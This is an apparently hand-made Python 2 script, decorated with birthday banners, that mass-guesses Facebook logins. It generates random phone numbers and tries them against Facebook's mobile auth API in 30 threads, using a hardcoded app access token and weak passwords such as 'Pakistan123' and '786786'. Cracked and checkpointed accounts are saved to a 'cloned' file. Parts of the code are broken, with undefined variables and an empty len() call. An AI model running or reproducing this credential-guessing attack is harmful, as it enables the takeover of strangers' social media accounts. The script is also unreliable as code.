# Ustad# SIDRA5# RANA MZ# 	Rana MZ# ZESHI#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(10000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 boss')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;91m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;91m\x1b[1;92m\033[1;91m\x1b[1;92m<<<------------W  E  L  L  C  O  M------------->>>
--------------------------------------------------
<<<-------------HAPPY BIRTHDAY--------------->>>
--------------------------------------------------
<<<-------------HAPPY BIRTHDAY--------------->>>
--------------------------------------------------
<<<-------------HAPPY BIRTHDAY--------------->>>
--------------------------------------------------
<<<-------------HAPPY BIRTHDAY--------------->>>
--------------------------------------------------
<<<-------------HAPPY BIRTHDAY--------------->>>
--------------------------------------------------
<<<-------------HAPPY BIRTHDAY--------------->>>
--------------------------------------------------
<<<-------------HAPPY BIRTHDAY--------------->>>
--------------------------------------------------
<<<-------------HAPPY BIRTHDAY--------------->>>
--------------------------------------------------
<<<-------------HAPPY BIRTHDAY--------------->>>
--------------------------------------------------
<<<-------------HAPPY BIRTHDAY--------------->>>

\033[1;97m\x1b[1;96m--------------------------------------------------
<<<----------R-A-H-U-L---M-I-S-H-R-A----------->>>
--------------------------------------------------
--------------------------------------------------
<<<<-----------CONGRATULATION---------------->>>
--------------------------------------------------
"""

####Logo####

logo1 = """
\033[1;91m\x1b[1;94m--------------------------------------------------
>>>>>HAPPY-BIRTHDAY>>>><<<<<HAPPY-BIRTHDAY<<<<<<
--------------------------------------------------
<<<---------R-A-H-U-L--M-I-S-H-R-A---------->>>
--------------------------------------------------
>>>>>HAPPY-BIRTHDAY>>>><<<<<HAPPY-BIRTHDAY<<<<<<
--------------------------------------------------
<<<---------R-A-H-U-L--M-I-S-H-R-A---------->>>
--------------------------------------------------
>>>>>HAPPY-BIRTHDAY>>>><<<<<HAPPY-BIRTHDAY<<<<<<
--------------------------------------------------
<<<---------R-A-H-U-L--M-I-S-H-R-A---------->>>
--------------------------------------------------
>>>>>HAPPY-BIRTHDAY>>>><<<<<HAPPY-BIRTHDAY<<<<<<
>>>>>HAPPY-BIRTHDAY>>>><<<<<HAPPY-BIRTHDAY<<<<<<
--------------------------------------------------
<<<---------R-A-H-U-L--M-I-S-H-R-A---------->>>
--------------------------------------------------
>>>>>HAPPY-BIRTHDAY>>>><<<<<HAPPY-BIRTHDAY<<<<<<
--------------------------------------------------
<<<---------R-A-H-U-L--M-I-S-H-R-A---------->>>
--------------------------------------------------
>>>>>HAPPY-BIRTHDAY>>>><<<<<HAPPY-BIRTHDAY<<<<<<
--------------------------------------------------
<<<---------R-A-H-U-L--M-I-S-H-R-A---------->>>
--------------------------------------------------
>>>>>HAPPY-BIRTHDAY>>>><<<<<HAPPY-BIRTHDAY<<<<<<
--------------------------------------------------
<<<---------R-A-H-U-L--M-I-S-H-R-A---------->>>
--------------------------------------------------
>>>>>HAPPY-BIRTHDAY>>>><<<<<HAPPY-BIRTHDAY<<<<<<
--------------------------------------------------
<<<---------R-A-H-U-L--M-I-S-H-R-A---------->>>
--------------------------------------------------
>>>>>HAPPY-BIRTHDAY>>>><<<<<HAPPY-BIRTHDAY<<<<<<
--------------------------------------------------
--------------------------------------------------
<<<---------R-A-H-U-L--M-I-S-H-R-A---------->>>
--------------------------------------------------
"""
logo2 = """
\033[1;91m\x1b[1;93m <<<-------------HAPPY BIRTHDAY--------------->>>
                     
\033[1;94mHAPPY-\x1b[1;94m --------------------------------------------------
<<<-------------HAPPY BIRTHDAY--------------->>>
--------------------------------------------------
<<<---------R-A-H-U-L--M-I-S-H-R-A---------->>>
--------------------------------------------------
"""
CorrectUsername = "HAPPY"
CorrectPassword = "BIRTHDAY"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m\x1b[1;94mTool Username \x1b[1;92m»» \x1b[1;96m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m \x1b[1;91mTool Password  \x1b[1;97m» \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Rana : MZ
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;94mWrong Password"
            os.system('xdg-open https://www.facebook.com/RE4L.H4CK3R')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://www.facebook.com/RE4L.H4CK3R')



##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print logo1
    print "\033[1;91m \x1b[1;91m ( \033[1;92m  )"
    time.sleep(0.05)
    print "\033[1;95m \x1b[1;94m "
    time.sleep(0.05)
    print '\x1b[1;94m \033[1;91m '
    pilih_login()

def pilih_login():
    peak = raw_input("\n\033[1;95m : \033[1;93m")
    if peak =="":
        print "\x1b[1;97m  "
        pilih_login()
    elif peak =="RM":
        Zeek()
def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;91m  '
    time.sleep(0.10)
    print '\x1b[1;93m  '
   
    time.sleep(0.05)
    action()

def action():
    peak = raw_input('\n\033[1;97m :\033[1;97m')
    if peak =='':
        print ' '
        action()
    elif peak =="RM":              
        os.system("clear")
        print logo2
        print " "+'\n'
        print '\x1b[1;91m '
        print '\x1b[1;92 \x1b[1;91 \x1b[1;93 \x1b[1;95m '
        try:
            c = raw_input("\033[1;97m  : ")
            k="03"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!]  ")
            raw_input("\n[   ]")
            blackmafiax()
    elif peak =='0':
        login()
    else:
        print '[!]  '
        action()
    print 50* '\033[1;94m-'
    xxx = str(len( ))
    jalan ('\033[1;91m : '+xxx)
    jalan ('\033[1;92m: '+c)
    jalan ("\033[1;93m \x1b[1;94m ...")
    jalan ("\033[1;94m ")
    print 50* '\033[1;97m-'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir(' ')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;95m(MZ)  ' + k + c + user + '  |  ' + pass1                                       
                okb = open('save/cloned.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m(\x1b[1;95mMZ) ' + k + c + user + '  |  ' + pass1
                    cps = open('save/cloned.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;91m(MZ-OK)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m(\x1b[1;93mMZ  ) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3="Pakistan123"
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m(MZ-OK)  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m(\x1b[1;93mMZ-CP) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    cps.write(k+c+user+pass3+'\n')
                                    cps.close()
                                    cpb.append(c+user+pass3)
                                else:
                                    pass4="00786"
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;93m(MZ-OK)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        okb.write(k+c+user+pass4+'\n')
                                        okb.close()
                                        oks.append(c+user+pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m\x1b[1;93m( MZ-CP) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            cps.write(k+c+user+pass4+'\n')
                                            cps.close()
                                            cpb.append(c+user+pass4)
                                        else:
                                            pass5="786786"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;93m(MZ-OK)  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                okb.write(k+c+user+pass5+'\n')
                                                okb.close()
                                                oks.append(c+user+pass5)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m\x1b[1;94m(MZ-CP) ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass5+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass5)
                                                                                                                                                                                                                
                                                                                                                                                                                                                
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            

        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'Process Has Been Completed ...'
    print 'Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
    print('Cloned Accounts Has Been Saved : save/cloned.txt')
    jalan("Note : Your CP account Will Open after 8 to 10 days MZ")
    print ''
    print """
    ███
──────────███║R║A║N║A║M║Z║███
\033[1;95mFb\033[1;97m 
\033[1;95m033[1;97m"""

    
    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
    login() 
          
if __name__ == '__main__':
    login()
